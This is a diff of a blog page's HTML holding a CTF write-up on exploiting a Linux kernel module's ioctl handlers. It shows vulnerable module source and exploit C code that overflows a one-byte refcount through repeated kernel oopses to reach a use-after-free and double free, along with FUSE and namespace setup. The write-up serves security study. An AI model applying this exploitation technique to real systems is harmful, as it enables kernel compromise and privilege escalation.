 </span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.info_addr, buf, <span style="color:#ae81ff">0x79</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Decrease the refcount 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
@@ -322,7 +322,7 @@
 <p>Now, here&rsquo;s the interesting part &ndash; when a kernel oops occurs, the kernel does not panic and explode; instead, the kernel would call make_task_dead, which then calls do_exit. The kernel is then able to resume execution as best as it can. However, this means that no recovery path is taken; all locks that were taken remain locked, and any changes to the refcount are not reversed. In this case, when DO_READ is called, the refcount is increased by one before the function attempts to memcpy from note_addr, and when the kernel oops occurs, code execution never reaches reference_put &ndash; the refcount remains incremented. We also know that the refcount is only one byte, and as such, by <strong>causing many null pointer dereferences which would cause many kernel oops to occur, we can cause a refcount overflow</strong>!! This refcount overflow can then be turned into a UAF via using the other ioctl functions, which can then be turned into a double free primitive.</p>
 <p>This is also the only ioctl option where locks were not taken &ndash; this is because the kernel oops would have caused all locks that were taken to remain locked. As such, if locks were taken, the null pointer dereference would have caused the challenge to explode. However technically, this also means that this function could be abused in a race condition exploit.</p>
 <p><strong>DO_NOTE: 0xc028ca04</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_NOTE: {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_NOTE: {
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(loan_ptr, <span style="color:#f92672">&amp;</span>loan_head) {
@@ -332,16 +332,16 @@
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Changing note for book at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_data.idx);
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Increase the refcount
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_get</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Free the old note
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { 
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) loan_entry<span style="color:#f92672">-&gt;</span>note_addr);
 </span></span><span style="display:flex;"><span>                        loan_entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Create the new note
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    loan_entry<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
+</span></span></span><span style="display:flex;"><span>                    loan_entry<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
 </span></span><span style="display:flex;"><span>                    note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(loan_entry<span style="color:#f92672">-&gt;</span>note_size, GFP_KERNEL); 
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> ((note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#66d9ef">uint64_t</span>) note <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>)) { 
 </span></span><span style="display:flex;"><span>                        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, loan_entry<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
@@ -350,26 +350,26 @@
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Decrease the refcount 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Unlock mutex
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Failure path
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span></code></pre></div><p>DO_NOTE only operates on books in the loan_list. The old note at note_addr is freed, before a new note is allocated. If a UAF is achieved on the book object, forging a book object would allow for control of note_addr, giving us arbitrary free.</p>
 <p><strong>DO_RETURN: 0xc028ca05</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_RETURN: { 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_RETURN: { 
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Lock mutexes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(loan_ptr, <span style="color:#f92672">&amp;</span>loan_head) {
@@ -377,31 +377,31 @@
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
 </span></span><span style="display:flex;"><span>                
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Check that the refcount is not equal to 1 or 0, if so, fail
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
 </span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// Unlock mutexes
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Decrement refcount
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reference_put</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>ref); 
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// If refcount is now 1 after decrement, remove from loan_list
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (loan_entry<span style="color:#f92672">-&gt;</span>ref.val <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">list_del</span>(<span style="color:#f92672">&amp;</span>loan_entry<span style="color:#f92672">-&gt;</span>loan_list); 
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                    
 </span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Unlock mutexes and finish
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Failure path
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
+</span></span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>book_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>loan_mutex);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
@@ -454,7 +454,7 @@
 </ol>
 <h4 id="setup">Setup</h4>
 <p>We will first perform setup before diving into the exploit. We will pin all actions to one CPU, set up the FUSE filesystem, enter a new namespace and open the librarymodule device.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;STAGE 1: SETUP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;STAGE 1: SETUP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Initial setup</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cpu_set_t</span> cpu;
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>cpu);
@@ -465,18 +465,18 @@
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setup FUSE pipes for sync
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">socketpair</span>(AF_LOCAL, SOCK_STREAM, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>fuse_pipe1[<span style="color:#ae81ff">0</span>]);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socketpair</span>(AF_LOCAL, SOCK_STREAM, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>fuse_pipe1[<span style="color:#ae81ff">0</span>]);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socketpair</span>(AF_LOCAL, SOCK_STREAM, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>fuse_pipe2[<span style="color:#ae81ff">0</span>]);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make FUSE directory
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Making FUSE directory /tmp/fuse_dir</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Making FUSE directory /tmp/fuse_dir</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mkdir</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir&#34;</span>, <span style="color:#ae81ff">0777</span>)) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] mkdir FUSE failed&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Start the FUSE filesystem
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Starting FUSE filesystem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Starting FUSE filesystem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fork</span>()) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">666</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fuse_main</span>(argc, argv, <span style="color:#f92672">&amp;</span>operations, NULL);
@@ -485,11 +485,11 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">667</span>); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Open FUSE files
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    fuse_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir/exp&#34;</span>, O_RDWR);
+</span></span></span><span style="display:flex;"><span>    fuse_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir/exp&#34;</span>, O_RDWR);
 </span></span><span style="display:flex;"><span>    fuse_fd2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir/exp2&#34;</span>, O_RDWR);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Do mmap for FUSE
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform mmap</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform mmap</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    copy_map <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (copy_map <span style="color:#f92672">==</span> MAP_FAILED) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] copy_map mmap failed&#34;</span>); 
@@ -519,44 +519,44 @@
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Enter sandbox
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">unshare</span>(CLONE_NEWUSER);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unshare</span>(CLONE_NEWUSER);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unshare</span>(CLONE_NEWNET);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Open librarymodule device
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening library device</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening library device</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/librarymodule&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open miscdevice&#34;</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><h4 id="trigger-kernel-heap-and-text-leak">Trigger, Kernel Heap and Text Leak</h4>
 <p>Getting the UAF is pretty simple once you figure out the whacky kernel oops refcount overflow thing. Firstly, we create book 0, causing the refcount to be initialized to 1. Performing DO_BORROW on book 0 would then increment the refcount to 2, and add book 0 to loan_list.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Create book 0
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Create book 0
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0x42</span>, <span style="color:#66d9ef">sizeof</span>(note)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(info, <span style="color:#ae81ff">0x43</span>, <span style="color:#66d9ef">sizeof</span>(info));
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_book</span>(name, <span style="color:#ae81ff">0x0</span>, note, info); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Borrow book 0
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">borrow_book</span>(<span style="color:#ae81ff">0</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">borrow_book</span>(<span style="color:#ae81ff">0</span>);
 </span></span></code></pre></div><p>We then write a separate program to perform DO_READ on book 0, and execute that program 0xff times (every time a kernel oops occurs, the process causing it would be killed):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Read book 0 to cause the refcount to loop back to 1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xff</span>; i<span style="color:#f92672">++</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Read book 0 to cause the refcount to loop back to 1
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xff</span>; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;./increment&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>increment.c:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x100</span>]; 
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> note[<span style="color:#ae81ff">0x100</span>]; 
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> info[<span style="color:#ae81ff">0x100</span>]; 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Open librarymodule device
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/librarymodule&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/librarymodule&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open miscdevice&#34;</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Read 0
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(name, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(name)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(note)); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(info, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(info));
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_book</span>(<span style="color:#ae81ff">0</span>, name, note, info); 
@@ -565,11 +565,11 @@
 </span></span></code></pre></div><p>If you turn on message logging with printk in the kernel, this is how the kernel oops looks like:</p>
 <p><img src="/images/dead-pwners-society/kernel-oops.jpg" alt="Kernel oops"></p>
